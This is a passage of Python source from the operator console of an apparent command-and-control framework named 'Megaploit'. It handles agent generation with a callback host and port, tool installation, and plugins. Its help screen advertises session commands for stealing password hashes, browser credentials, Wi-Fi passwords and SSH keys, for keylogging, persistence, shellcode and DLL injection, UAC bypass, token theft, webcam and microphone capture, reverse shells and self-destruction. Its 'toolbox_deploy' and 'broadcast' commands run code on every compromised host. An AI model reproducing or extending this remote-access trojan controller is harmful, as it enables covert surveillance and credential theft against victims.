        use_tls = "--tls" in args or "-t" in args
        _patch_agent(self.lhost, self.port, use_tls=use_tls)
        if "--compile" in args or "-c" in args:
            try:
                py_compile.compile("agent.py", doraise=True)
                print(ok("agent.py byte-compiled"))
            except py_compile.PyCompileError as e:
                print(err(f"Compile error: {e}"))

    def _cmd_set(self, args: list[str]) -> None:
        if len(args) != 2:
            print(err("Usage: set <option> <value>"))
            _show_options(self)
            return
        key, val = args[0].lower(), args[1]
        if key == "lhost":
            self.lhost = val
            print(ok(f"lhost  →  {_c(val, _CYAN)}"))
        elif key == "port":
            try:
                self.port = int(val)
                print(ok(f"port  →  {_c(val, _CYAN)}"))
            except ValueError:
                print(err("port must be an integer"))
        elif key == "cert":
            self.cert = val
            print(ok(f"cert  →  {_c(val, _CYAN)}"))
        elif key == "key":
            self.key_file = val
            print(ok(f"key  →  {_c(val, _CYAN)}"))
        elif key == "auto_update":
            if val.lower() in ("on", "true", "1", "yes"):
                self.auto_update = True
                if self._updater:
                    self._updater.auto_update = True
                print(ok(f"auto_update  →  {_c('on', _GREEN)}  (tools update automatically)"))
            elif val.lower() in ("off", "false", "0", "no"):
                self.auto_update = False
                if self._updater:
                    self._updater.auto_update = False
                print(ok(f"auto_update  →  {_c('off', _GREY)}  (notifications only)"))
            else:
                print(err("auto_update must be  on  or  off"))
        else:
            print(err(f"Unknown option: {_c(key, _BOLD)}"))

    # ---------------------------------------------------------------
    # Help screen
    # ---------------------------------------------------------------

    def _global_help(self) -> None:
        tools   = _tool_registry.all()
        plugins = _plugin_loader.plugins()

        def _cmd_row(cmd: str, desc: str) -> str:
            return f"  {_c(cmd, _CYAN):<{32 + 9}}  {_c(desc, _GREY)}"

        def _opt_row(key: str, val: str) -> str:
            val_col = _c(val, _WHITE) if val not in ("(not set)", "(none)", "off") else _c(val, _DIM)
            return f"  {_c(key, _YELLOW):<{16 + 9}}  {val_col}"

        lines = [
            "",
            _section("Global Commands"),
            "",
            _cmd_row("sessions",                      "List active sessions (tag + OS columns)"),
            _cmd_row("use <id>",                      "Interact with a session"),
            _cmd_row("broadcast <cmd>",               "Run a shell cmd on ALL active sessions"),
            _cmd_row("generate [-c] [--tls]",         "Patch agent.py  (-c compile, --tls enable TLS)"),
            _cmd_row("set <option> <value>",          "Set lhost / port / cert / key / auto_update"),
            "",
            _section("Toolbox"),
            "",
            _cmd_row("toolbox install <url> <name>",   "Install a GitHub/GitLab/Bitbucket tool"),
            _cmd_row("toolbox catalogue [query]",      "Browse / install from 200+ tool catalogue"),
            _cmd_row("toolbox catalogue install <n>",  "Install a tool from the catalogue by name"),
            _cmd_row("toolbox list",                   "Show installed tools"),
            _cmd_row("toolbox search <query>",         "Search tools by name / tag / description"),
            _cmd_row("toolbox info <name>",            "Show tool details"),
            _cmd_row("toolbox update <name>",          "Pull latest changes"),
            _cmd_row("toolbox rebuild <name>",         "Re-build in place (no pull)"),
            _cmd_row("toolbox remove <name>",          "Uninstall a tool"),
            _cmd_row("toolbox set-entry <name> <p>",   "Override the entry-point path"),
            _cmd_row("toolbox healthcheck [name]",     "Verify tool(s) are in a runnable state"),
            _cmd_row("toolbox dockerfile <name>",      "Generate a Dockerfile for a tool"),
            _cmd_row("toolbox audit <name>",           "Run security audit on a tool"),
            _cmd_row("toolbox plan <name|url>",        "Show install plan (dry-run)"),
            _cmd_row("toolbox workspace <sub>",        "Named tool groups (list/new/install-all/export)"),
            _cmd_row("toolbox config <name>",          "Show/edit per-tool runtime config"),
            "",
            _section("Plugins"),
            "",
            _cmd_row("plugins",                       "List loaded plugins"),
            _cmd_row("plugins reload",                "Re-scan plugins/ directory"),
            _cmd_row("plugins info <name>",           "Show plugin details"),
            _cmd_row("plugins enable <name>",         "Enable a disabled plugin"),
            _cmd_row("plugins disable <name>",        "Disable a plugin (persisted)"),
            _cmd_row("plugins load <path|url>",       "Load plugin from file path or URL"),
            _cmd_row("plugins watcher on|off",        "Toggle hot-reload watcher"),
            _cmd_row("plugins deps install",          "pip-install missing plugin dependencies"),
            "",
            _section("Operations"),
            "",
            _cmd_row("engagement [name|desc|show]",   "Name / describe the current engagement"),
            _cmd_row("loot [browse|export|clear]",    "Browse collected loot files"),
            _cmd_row("env_probe [name]",              "Probe operator toolchain / env"),
            _cmd_row("alias <name> <cmd>",            "Create a command alias"),
            _cmd_row("unalias <name>",                "Remove a command alias"),
            _cmd_row("aliases",                       "List all defined aliases"),
            _cmd_row("workspace <sub>",               "Named tool groups"),
            _cmd_row("history [n|search <q>|clear]",  "Show / search command history"),
            _cmd_row("whats new",                     f"Re-show the {_VERSION} changelog"),
            _cmd_row("clear",                         "Clear the terminal"),
            _cmd_row("exit",                          "Quit Megaploit"),
            "",
            _section("Options"),
            "",
            _opt_row("lhost",        self.lhost or "(not set)"),
            _opt_row("port",         str(self.port)),
            _opt_row("cert",         self.cert or "(none)"),
            _opt_row("key",          self.key_file or "(none)"),
            _opt_row("auto_update",  "on" if self.auto_update else "off"),
            _opt_row("engagement",   self.engagement_name or "(not set)"),
            "",
            _section("Session Commands  (inside  use <id>)"),
            "",
            _cmd_row("File transfer",   "upload  download  zip_download"),
            _cmd_row("Screen / audio",  "screenshot  screenshot_timelapse  record  mic_level"),
            _cmd_row("Screen record",   "screenrecord <secs>"),
            _cmd_row("Streaming",       "screen_stream  webcam"),
            _cmd_row("Credentials",     "hashdump  wifi_passwords  browser_history"),
            _cmd_row("Browser",         "browser_creds [cookies|passwords|all]"),
            _cmd_row("Adv. creds",      "cred_vault  ssh_harvest  sudo_sniff"),
            _cmd_row("Search",          "search <path> <keyword>"),
            _cmd_row("Clipboard",       "getclip  setclip"),
            _cmd_row("Network pivot",   "portfwd  socks5  " + _c("reverse_shell [!]", _YELLOW)),
            _cmd_row("Awareness",       "idle_time  sysinfo  mic_level"),
            _cmd_row("GUI / input",     "msgbox  mouse_move  type_keys  lock_screen"),
            _cmd_row("Injection",       _c("inject_shellcode [!]  dll_inject [!]", _YELLOW)),
            _cmd_row("Priv. esc.",      _c("uac_bypass [!]  token_steal [!]", _YELLOW)),
            _cmd_row("LOLBins",         _c("living_off_land [!]", _YELLOW)),
            _cmd_row("Persistence",     "persist  keylog_start/dump/stop"),
            _cmd_row("Cleanup",         _c("self_destruct [!]", _YELLOW)),
            _cmd_row("Toolbox",         "toolbox_run <name>  toolbox_deploy <name>"),
            _cmd_row("Shell passthrough","any unrecognised command runs as shell"),
            "",
        ]

        if tools:
            lines += [_section("Installed Tools"), ""]
            for t in tools:
                dot    = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
                lang   = _c(f"[{t.lang}]", _DIM)
                desc   = t.description[:48] + ("…" if len(t.description) > 48 else "")
                lines.append(
                    f"  {dot} {_c(t.name, _CYAN, _BOLD):<{20 + 9}}  {lang:<{10 + 9}}  {_c(desc, _GREY)}"
                )
            lines.append("")

        if plugins:
            lines += [_section("Loaded Plugins"), ""]
            for p in plugins:
                ncmds = _c(f"{len(p.commands)} cmd", _DIM)
                desc  = p.description[:42] + ("…" if len(p.description) > 42 else "")
                lines.append(
                    f"  {_c('◆', _MAGENTA)} {_c(p.name, _CYAN):<{20 + 9}}  "
                    f"{_c(f'v{p.version}', _DIM):<{10 + 9}}  {_c(desc, _GREY)}  {ncmds}"
                )
            lines.append("")

        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Toolbox command dispatcher
    # ---------------------------------------------------------------

    def _cmd_toolbox(self, args: list[str]) -> None:
        if not args:
            self._toolbox_help()
            return

        sub  = args[0].lower()
        rest = args[1:]

        dispatch_map = {
            "install":        lambda: self._toolbox_install(rest),
            "catalogue":      lambda: self._toolbox_catalogue(rest),
            "list":           lambda: self._toolbox_list(),
            "search":         lambda: self._toolbox_search(rest),
            "info":           lambda: self._toolbox_info(rest),
            "remove":         lambda: self._toolbox_remove(rest),
            "update":         lambda: self._toolbox_update(rest),
            "update-all":     lambda: self._toolbox_update_all(),
            "check-updates":  lambda: self._toolbox_check_updates(),
            "rebuild":        lambda: self._toolbox_rebuild(rest),
            "set-entry":      lambda: self._toolbox_set_entry(rest),
            "healthcheck":    lambda: self._toolbox_healthcheck(rest),
            "dockerfile":     lambda: self._toolbox_dockerfile(rest),
            "audit":          lambda: self._toolbox_audit(rest),
            "plan":           lambda: self._toolbox_plan(rest),
            "workspace":      lambda: self._toolbox_workspace(rest),
            "config":         lambda: self._toolbox_config(rest),
        }
        fn = dispatch_map.get(sub)
        if fn:
            fn()
        else:
            print(err(f"Unknown toolbox sub-command: {_c(sub, _BOLD)}"))
            self._toolbox_help()

    # ------------------------------------------------------------------

    def _toolbox_install(self, args: list[str]) -> None:
        if len(args) < 2:
            print(err("Usage: toolbox install <repo_url> <name> [description] [--tags a,b]"))
            return

        repo_url    = args[0]
        name        = args[1]
        description = ""
        tags: list[str] = []
        i = 2
        while i < len(args):
            if args[i] == "--tags" and i + 1 < len(args):
                tags = [t.strip() for t in args[i + 1].split(",")]
                i += 2
            else:
                description += (" " if description else "") + args[i]
                i += 1

        print()
        print(_box_top(f"Installing  {name}"))
        print(_box_row(_kv("Source", _c(repo_url, _GREY))))
        if tags:
            print(_box_row(_kv("Tags", _c(", ".join(tags), _CYAN))))
        print(_box_bot())
        print()

        # Track build stages for a simple progress bar
        _STAGES = ["clone", "detect", "build", "deps", "entry", "register"]
        pb = _ProgressBar(total=len(_STAGES), label="cloning…")

        def _progress(line: str) -> None:
            # Advance bar on recognisable milestones
            if   "[*] Cloning"    in line: pb.set_label("cloning…")
            elif "[*] Detected"   in line: pb.step(); pb.set_label("building…")
            elif "[+] Go build"   in line: pb.step(); pb.set_label("go build…")
            elif "[+] Rust build" in line: pb.step(); pb.set_label("cargo…")
            elif "[+] Maven"      in line: pb.step(); pb.set_label("mvn…")
            elif "[+] npm"        in line: pb.step(); pb.set_label("npm…")
            elif "[+] Python"     in line: pb.step(); pb.set_label("pip…")
            elif "[*] Entry"      in line: pb.step(); pb.set_label("registering…")
            elif "[+]"            in line: pb.step()

        try:
            with _Spinner(f"Cloning {repo_url}…"):
                tool = _installer.install(
                    repo_url=repo_url,
                    name=name,
                    description=description,
                    tags=tags,
                    progress=_progress,
                )
            pb.finish()
            print()
            print(_box_top(f"✓  {name}  installed", color=_GREEN))
            print(_box_row(_kv("Entry-point", _c(tool.entry, _WHITE)),  color=_GREEN))
            print(_box_row(_kv("Language",    _c(tool.lang,  _YELLOW)), color=_GREEN))
            print(_box_row(_kv("Path",        _c(tool.path,  _GREY)),   color=_GREEN))
            print(_box_row(_kv("Run locally", _c(f"toolbox_run {name} [args]", _CYAN)), color=_GREEN))
            print(_box_row(_kv("Deploy",      _c(f"toolbox_deploy {name} [args]", _CYAN)), color=_GREEN))
            print(_box_bot(color=_GREEN))
        except RuntimeError as e:
            pb.finish()
            print(err(str(e)))

    def _toolbox_list(self) -> None:
        tools = _tool_registry.all()
        if not tools:
            print(info(f"No tools installed.  Use:  {_c('toolbox install <url> <name>', _CYAN)}"))
            return
        print()
        hdr = f"  {'':2}{'NAME':<18} {'LANG':<10} {'ENTRY':<22} DESCRIPTION"
        print(_c(hdr, _BOLD, _WHITE))
        print(_rule("─"))
        for t in tools:
            dot  = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
            lang = _c(f"[{t.lang}]", _YELLOW)
            desc = t.description[:36] + ("…" if len(t.description) > 36 else "")
            entry = (t.entry[:20] + "…") if len(t.entry) > 20 else t.entry
            print(f"  {dot} {_c(t.name, _CYAN):<{17 + 9}} {lang:<{10 + 9}} {entry:<22} {_c(desc, _GREY)}")
        print()

    def _toolbox_search(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox search <query>"))
            return
        query   = " ".join(args)
        results = _tool_registry.search(query)
        if not results:
            print(info(f"No tools match {_c(repr(query), _YELLOW)}."))
            return
        print()
        for t in results:
            dot = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
            print(f"  {dot} {_c(t.name, _CYAN, _BOLD):<{22 + 9}}  {t.description[:60]}")
            print(f"       {_c(t.repo, _GREY)}")
            if t.tags:
                print(f"       {' '.join(_c(tag, _DIM) for tag in t.tags)}")
        print()

    def _toolbox_info(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox info <name>"))
            return
        t = _tool_registry.get(args[0])
        if not t:
            print(err(f"Tool '{args[0]}' not found."))
            return
        run_cmd_str = " ".join(t.run_cmd) if t.run_cmd else _c("(auto)", _GREY)
        dot = _c("● installed", _GREEN) if t.is_installed else _c("○ missing", _RED)
        print()
        print(_box_top(f"Tool: {t.name}"))
        print(_box_row(_kv("Name",         _c(t.name, _CYAN, _BOLD))))
        print(_box_row(_kv("Status",       dot)))
        print(_box_row(_kv("Language",     _c(t.lang, _YELLOW))))
        print(_box_row(_kv("Repository",   _c(t.repo, _GREY))))
        print(_box_row(_kv("Description",  t.description[:58])))
        print(_box_row(_kv("Entry-point",  _c(t.entry, _WHITE))))
        print(_box_row(_kv("Run command",  _c(run_cmd_str, _DIM))))
        print(_box_row(_kv("Path",         _c(t.path, _GREY))))
        print(_box_row(_kv("Installed at", t.installed_at or "unknown")))
        if t.tags:
            print(_box_row(_kv("Tags", "  ".join(_c(tag, _CYAN) for tag in t.tags))))
        print(_box_bot())
        print()
        print(f"  {_c('Session usage:', _BOLD, _WHITE)}")
        print(f"    {_c('toolbox_run', _CYAN)} {t.name} {_c('[args]', _GREY)}")
        print(f"    {_c('toolbox_deploy', _CYAN)} {t.name} {_c('[args]', _GREY)}")
        print()

    def _toolbox_remove(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox remove <name>"))
            return
        name = args[0]
        print()
        print(_c(f"  ⚠  Remove '{name}' and delete all its files?", _YELLOW, _BOLD))
        confirm = input(_c("     Type YES to confirm: ", _YELLOW)).strip()
        if confirm.lower() != "yes":
            print(warn("  Cancelled."))
            return
        try:
            _installer.uninstall(name, progress=print)
            print(ok(f"'{name}' removed."))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox update <name>"))
            return
        name = args[0]
        print(info(f"Updating {_c(name, _CYAN)}…"))
        try:
            with _Spinner(f"Pulling & rebuilding {name}…"):
                _installer.update(name, progress=lambda l: None)
            print(ok(f"'{name}' updated."))
            if self._updater:
                self._updater.check_now()
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update_all(self) -> None:
        tools = _tool_registry.all()
        if not tools:
            print(info("No tools installed."))
            return
        any_ok = False
        for t in tools:
            if not t.is_installed:
                print(warn(f"  Skipping '{t.name}' — directory not found"))
                continue
            try:
                with _Spinner(f"Updating {t.name}…"):
                    _installer.update(t.name, progress=lambda l: None)
                print(ok(f"'{t.name}' updated."))
                any_ok = True
            except RuntimeError as e:
                print(err(f"  {t.name}: {e}"))
        if any_ok and self._updater:
            self._updater.check_now()

    def _toolbox_check_updates(self) -> None:
        print(info("Checking for updates…"))
        if self._updater:
            self._updater.check_now()
            time.sleep(2)
            for note in self._updater.drain():
                print(note)
        else:
            print(warn("Update checker not running (git not on PATH?)."))

    def _toolbox_rebuild(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox rebuild <name>"))
            return
        name = args[0]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        if not t.is_installed:
            print(err(f"Tool directory missing: {t.path}"))
            return
        print(info(f"Rebuilding '{name}'…"))
        try:
            with _Spinner(f"Building {name}…"):
                t.run_cmd  = _installer.build(t.path, name, t.lang, progress=lambda l: None)
                t.entry    = _installer.detect_entry(t.path, name, t.lang)
            _tool_registry.add(t)
            print(ok(f"'{name}' rebuilt."))
            print(f"  {_kv('Entry',   _c(t.entry,          _WHITE))}")
            print(f"  {_kv('Command', _c(' '.join(t.run_cmd), _GREY))}")
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_set_entry(self, args: list[str]) -> None:
        if len(args) < 2:
            print(err("Usage: toolbox set-entry <name> <entry_path>"))
            return
        name, entry = args[0], args[1]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        t.entry = entry
        _tool_registry.add(t)
        print(ok(f"Entry-point for '{name}'  →  {_c(entry, _CYAN)}"))

    def _toolbox_catalogue(self, args: list[str]) -> None:
        """Browse or install from the built-in 60+ tool catalogue."""
        if args and args[0].lower() == "install":
            if len(args) < 2:
                print(err("Usage: toolbox catalogue install <short-name> [local-name]"))
                return
            short = args[1]
            name  = args[2] if len(args) > 2 else short
            print()
            print(_box_top(f"Catalogue install  {short}"))
            lines: list[str] = []
            pb = _ProgressBar(total=6, label="cloning…")

            def _progress(line: str) -> None:
                if   "[*] Cloning"    in line: pb.set_label("cloning…")
                elif "[*] Detected"   in line: pb.step(); pb.set_label("building…")
                elif "[+] Python"     in line: pb.step(); pb.set_label("pip…")
                elif "[+] Go build"   in line: pb.step(); pb.set_label("go build…")
                elif "[+] Rust build" in line: pb.step(); pb.set_label("cargo…")
                elif "[+] npm"        in line: pb.step(); pb.set_label("npm…")
                elif "[+]"            in line: pb.step()
                lines.append(line)

            try:
                with _Spinner(f"Cloning from catalogue: {short}…"):
                    tool = _installer.install_from_catalogue(
                        short_name=short,
                        name_override=name,
                        progress=_progress,
                    )
                pb.finish()
                print()
                print(_box_top(f"✓  {name}  installed", color=_GREEN))
                print(_box_row(_kv("Entry-point", _c(tool.entry, _WHITE)),  color=_GREEN))
                print(_box_row(_kv("Language",    _c(tool.lang,  _YELLOW)), color=_GREEN))
                print(_box_row(_kv("Path",        _c(tool.path,  _GREY)),   color=_GREEN))
                print(_box_bot(color=_GREEN))
            except RuntimeError as e:
                pb.finish()
                print(err(str(e)))
            return

        # Default: list catalogue with optional search query
        query = " ".join(args) if args else ""
        results = _installer.list_catalogue(query)
        if not results:
            print(info(f"No catalogue entries match {_c(repr(query), _YELLOW)}."))
            return
        print()
        hdr = f"  {'NAME':<24} {'TAGS':<28} DESCRIPTION"
        print(_c(hdr, _BOLD, _WHITE))
        print(_rule("─"))
        installed_names = {t.name for t in _tool_registry.all()}
        for key, entry in results:
            dot  = _c("●", _GREEN) if key in installed_names else _c("○", _GREY)
            tags = _c(", ".join(entry.tags[:4]), _DIM)
            desc = entry.description[:42] + ("…" if len(entry.description) > 42 else "")
            print(f"  {dot} {_c(key, _CYAN):<{23 + 9}}  {tags:<{28 + 9}}  {_c(desc, _GREY)}")
        print()
        print(f"  {_c('Install:', _GREY)} {_c('toolbox catalogue install <name>', _CYAN)}")
        print()

    def _toolbox_healthcheck(self, args: list[str]) -> None:
        if not args:
            # Check all installed tools
            tools = _tool_registry.all()
            if not tools:
                print(info("No tools installed."))
                return
            print()
            all_ok = True
            for t in tools:
                lines: list[str] = []
                healthy = _installer.healthcheck(t.name, progress=lines.append)
                status = _c("● healthy", _GREEN) if healthy else _c("✗ FAILED", _RED)
                print(f"  {status}  {_c(t.name, _CYAN, _BOLD)}")
                if not healthy:
                    all_ok = False
                    for l in lines:
                        print(f"    {_c(l, _GREY)}")
            print()
            if all_ok:
                print(ok("All tools healthy."))
            else:
                print(warn("Some tools have issues — see details above."))
            return

        name = args[0]
        lines: list[str] = []
        healthy = _installer.healthcheck(name, progress=lines.append)
        for l in lines:
            print(l)
        if healthy:
            print(ok(f"'{name}' is healthy."))
        else:
            print(err(f"'{name}' health check failed."))

    def _toolbox_dockerfile(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox dockerfile <name>"))
            return
        name = args[0]
        try:
            path = _installer.generate_dockerfile(name, progress=print)
            print(ok(f"Dockerfile written: {_c(path, _CYAN)}"))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_audit(self, args: list[str]) -> None:
        """toolbox audit <name>  — run ToolAudit on an installed tool's source."""
        if not args:
            print(err("Usage: toolbox audit <name>"))
            return
        name = args[0]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        if not t.is_installed:
            print(err(f"Tool '{name}' directory missing."))
            return
        try:
            report = _installer.tool_auditor.audit(t.path, t.name)
        except Exception as e:
            print(err(f"Audit failed: {e}"))
            return
        print()
        print(_box_top(f"Audit: {name}"))
        score_col = _c(str(report.score), _GREEN if report.score >= 70 else _RED, _BOLD)
        print(_box_row(_kv("Score",    f"{score_col} / 100")))
        print(_box_row(_kv("Files",    str(report.file_count))))
        print(_box_row(_kv("Findings", str(len(report.findings)))))
        if report.license:
            print(_box_row(_kv("License",  _c(report.license, _CYAN))))
        print(_box_bot())
        if report.findings:
            print(_section("Findings"))
            for f in report.findings:
                sev = _c(f.severity.upper(), _RED if f.severity == "high" else _YELLOW)
                print(f"  {sev}  {_c(f.path, _GREY)}:{f.line}  {f.message}")
            print()
        else:
            print(ok("No findings."))

    def _toolbox_plan(self, args: list[str]) -> None:
        """toolbox plan <name|url>  — dry-run an install plan."""
        if not args:
            print(err("Usage: toolbox plan <catalogue-name|repo-url>"))
            return
        target = args[0]
        try:
            # Try catalogue first, then treat as URL
            if "://" in target:
                plan = _installer.InstallPlan.from_url(target, name=target.rstrip("/").split("/")[-1])
            else:
                plan = _installer.InstallPlan.from_catalogue(target)
        except Exception as e:
            print(err(f"Cannot build plan: {e}"))
            return
        print()
        print(_box_top(f"Install Plan: {plan.name}"))
        print(_box_row(_kv("Steps",   str(len(plan.steps)))))
        print(_box_row(_kv("Cached",  _c("yes", _GREEN) if plan.is_cached else _c("no", _GREY))))
        print(_box_bot())
        print(_section("Steps"))
        for i, step in enumerate(plan.steps, 1):
            print(f"  {_c(str(i), _CYAN, _BOLD)}.  {step}")
        print()

    def _toolbox_workspace(self, args: list[str]) -> None:
        """toolbox workspace list|new|install-all|export|import <sub-args>"""
        sub  = args[0].lower() if args else "list"
        rest = args[1:]

        if sub in ("list", "ls"):
            ws = _installer.workspace_manager
            names = ws.list_workspaces()
            if not names:
                print(info("No workspaces defined.  Create one with:  toolbox workspace new <name>"))
                return
            print()
            hdr = f"  {'WORKSPACE':<20} {'TOOLS':<8} DESCRIPTION"
            print(_c(hdr, _BOLD, _WHITE))
            print(_rule("─"))
            for wname in names:
                space = ws.get(wname)
                if space:
                    desc  = space.get("description", "")[:40]
                    tools = ", ".join(space.get("tools", []))[:30]
                    print(f"  {_c(wname, _CYAN):<{20 + 9}} {_c(tools, _GREY):<{8 + 9}} {_c(desc, _DIM)}")
            print()

        elif sub == "new":
            if not rest:
                print(err("Usage: toolbox workspace new <name> [description]"))
                return
            name = rest[0]
            desc = " ".join(rest[1:])
            _installer.workspace_manager.create(name, description=desc)
            print(ok(f"Workspace '{name}' created."))

        elif sub in ("install-all", "install_all"):
            if not rest:
                print(err("Usage: toolbox workspace install-all <name>"))
                return
            wname = rest[0]
            print(info(f"Installing all tools in workspace '{wname}'…"))
            try:
                results = _installer.workspace_manager.install_all(wname, progress=print)
                ok_count = sum(1 for v in results.values() if v)
                print(ok(f"{ok_count}/{len(results)} tools installed."))
            except Exception as e:
                print(err(str(e)))

        elif sub == "add":
            if len(rest) < 2:
                print(err("Usage: toolbox workspace add <workspace> <tool>"))
                return
            wname, tname = rest[0], rest[1]
            _installer.workspace_manager.add_tool(wname, tname)
            print(ok(f"Added '{tname}' to workspace '{wname}'."))

        elif sub == "remove":
            if len(rest) < 2:
                print(err("Usage: toolbox workspace remove <workspace> <tool>"))
                return
            wname, tname = rest[0], rest[1]
            _installer.workspace_manager.remove_tool(wname, tname)
            print(ok(f"Removed '{tname}' from workspace '{wname}'."))

        elif sub == "export":
            if not rest:
                print(err("Usage: toolbox workspace export <name> [path]"))
                return
            wname = rest[0]
            path  = rest[1] if len(rest) > 1 else f"{wname}.json"
            try:
                _installer.workspace_manager.export_json(wname, path)
                print(ok(f"Workspace '{wname}' exported to {_c(path, _CYAN)}"))
            except Exception as e:
                print(err(str(e)))

        elif sub == "import":
            if not rest:
                print(err("Usage: toolbox workspace import <path>"))
                return
            path = rest[0]
            try:
                name = _installer.workspace_manager.import_json(path)
                print(ok(f"Workspace '{name}' imported from {_c(path, _CYAN)}"))
            except Exception as e:
                print(err(str(e)))

        elif sub == "delete":
            if not rest:
                print(err("Usage: toolbox workspace delete <name>"))
                return
            wname = rest[0]
            _installer.workspace_manager.delete(wname)
            print(ok(f"Workspace '{wname}' deleted."))

        else:
            print(err(f"Unknown workspace sub-command: {sub}"))
            print(info("Usage: toolbox workspace list|new|add|remove|install-all|export|import|delete"))

    def _toolbox_config(self, args: list[str]) -> None:
        """toolbox config <name> [set <key> <val>]  — view/edit per-tool runtime config."""
        if not args:
            print(err("Usage: toolbox config <name> [set <key> <val>]"))
            return
        name = args[0]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        tc = _installer.tool_config
        if len(args) >= 4 and args[1].lower() == "set":
            key, val = args[2], args[3]
            cfg = tc.get(name)
            cfg[key] = val
            tc.set(name, cfg)
            print(ok(f"toolbox config  {name}.{key}  →  {_c(val, _CYAN)}"))
            return
        cfg = tc.get(name)
        print()
        print(_box_top(f"Config: {name}"))
        for k, v in sorted(cfg.items()):
            print(_box_row(_kv(k, _c(str(v), _WHITE))))
        print(_box_bot())
        print()
        print(f"  {_c('Edit:', _GREY)} toolbox config {name} set <key> <value>")
        print()

    def _toolbox_help(self) -> None:
        def _r(cmd: str, desc: str) -> str:
            return f"  {_c(cmd, _CYAN):<{36 + 9}}  {_c(desc, _GREY)}"

        lines = [
            "",
            _section("toolbox sub-commands"),
            "",
            _r("toolbox install <url> <name>",     "Clone & install from GitHub/GitLab/Bitbucket"),
            _r("toolbox catalogue [query]",         "Browse built-in catalogue of 200+ tools"),
            _r("toolbox catalogue install <name>",  "Install a tool from the catalogue by short name"),
            _r("toolbox list",                      "Show all installed tools"),
            _r("toolbox search <query>",            "Search by name / tag / description"),
            _r("toolbox info <name>",               "Show tool details & usage"),
            _r("toolbox update <name>",             "Pull latest changes (git pull + rebuild)"),
            _r("toolbox update-all",                "Update every installed tool at once"),
            _r("toolbox check-updates",             "Check now for available updates"),
            _r("toolbox rebuild <name>",            "Re-run build step (no git pull)"),
            _r("toolbox remove <name>",             "Uninstall a tool"),
            _r("toolbox set-entry <name> <p>",      "Override the entry-point path"),
            _r("toolbox healthcheck [name]",        "Verify tool(s) are runnable (omit name = all)"),
            _r("toolbox dockerfile <name>",         "Generate a Dockerfile for a tool"),
            _r("toolbox audit <name>",              "Run security/quality audit on tool source"),
            _r("toolbox plan <name|url>",           "Dry-run an install — show all steps"),
            _r("toolbox workspace <sub>",           "Manage named tool groups"),
            _r("toolbox config <name> [set k v]",   "View or edit per-tool runtime config"),
            "",
            _section("Inside a session"),
            "",
            _r("toolbox_run <name> [args]",         "Run tool locally (operator side)"),
            _r("toolbox_deploy <name> [args]",      "Upload & run tool on target"),
            "",
        ]
        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Plugins command
    # ---------------------------------------------------------------

    def _cmd_plugins(self, args: list[str]) -> None:
        sub = args[0].lower() if args else "list"
        if sub in ("list", "ls"):
            self._plugins_list()
        elif sub == "reload":
            self._plugins_reload()
        elif sub == "info":
            self._plugins_info(args[1:])
        elif sub == "enable":
            self._plugins_enable(args[1:])
        elif sub == "disable":
            self._plugins_disable(args[1:])
        elif sub == "load":
            self._plugins_load(args[1:])
        elif sub == "watcher":
            self._plugins_watcher(args[1:])
        elif sub == "deps":
            self._plugins_deps(args[1:])
        else:
            self._plugins_info(args)

    def _plugins_list(self) -> None:
        plugins = _plugin_loader.plugins()
        if not plugins:
            print(info("No plugins loaded."))
            print(info(f"Drop a .toml file into  {_c('plugins/', _CYAN)}  then run  {_c('plugins reload', _CYAN)}"))
            return
        print()
        hdr = f"  {'PLUGIN':<20} {'VER':<10} {'CMDS':<6} DESCRIPTION"
        print(_c(hdr, _BOLD, _WHITE))
        print(_rule("─"))
        for p in plugins:
            ncmds = str(len(p.commands))
            desc  = p.description[:42] + ("…" if len(p.description) > 42 else "")
            print(f"  {_c('◆', _MAGENTA)} {_c(p.name, _CYAN):<{19 + 9}} {p.version:<10} {ncmds:<6} {_c(desc, _GREY)}")
        print()
        all_cmd_names = _plugin_loader.all_command_names()
        if all_cmd_names:
            print(_section("Plugin commands"))
            for cname in all_cmd_names:
                pc  = _plugin_loader.get_command(cname)
                tag = _c("  [!]", _RED) if pc.dangerous else ""
                print(f"    {_c(cname, _GREEN):<{28 + 9}}  {_c(pc.description, _GREY)}{tag}")
            print()

    def _plugins_reload(self) -> None:
        print(info("Reloading plugins…"))
        loaded, _errs = _plugin_loader.load_all()
        if loaded:
            print(ok(f"Loaded {loaded} plugin(s)."))
        else:
            print(info(f"No plugins found in  {_c('plugins/', _CYAN)}"))
        for fname, msg in _plugin_loader.errors():
            print(warn(f"  Error in '{fname}': {msg}"))

    def _plugins_info(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: plugins info <name>"))
            return
        p = _plugin_loader.get(args[0])
        if not p:
            print(err(f"Plugin '{args[0]}' not loaded."))
            return
        print()
        print(_box_top(f"Plugin: {p.name}"))
        print(_box_row(_kv("Name",        _c(p.name, _CYAN, _BOLD))))
        print(_box_row(_kv("Version",     p.version)))
        print(_box_row(_kv("Author",      p.author or "(unknown)")))
        print(_box_row(_kv("Description", p.description[:58])))
        print(_box_row(_kv("License",     p.license or "(none)")))
        print(_box_row(_kv("Homepage",    _c(p.homepage, _GREY) if p.homepage else "(none)")))
        if p.tags:
            print(_box_row(_kv("Tags",    "  ".join(_c(t, _DIM) for t in p.tags))))
        if p.requires:
            print(_box_row(_kv("Requires", "  ".join(_c(r, _YELLOW) for r in p.requires))))
        enabled_str = _c("enabled", _GREEN) if p.enabled else _c("disabled", _RED)
        print(_box_row(_kv("Status",  enabled_str)))
        print(_box_row(_kv("Source",  _c(p.source_path, _GREY))))
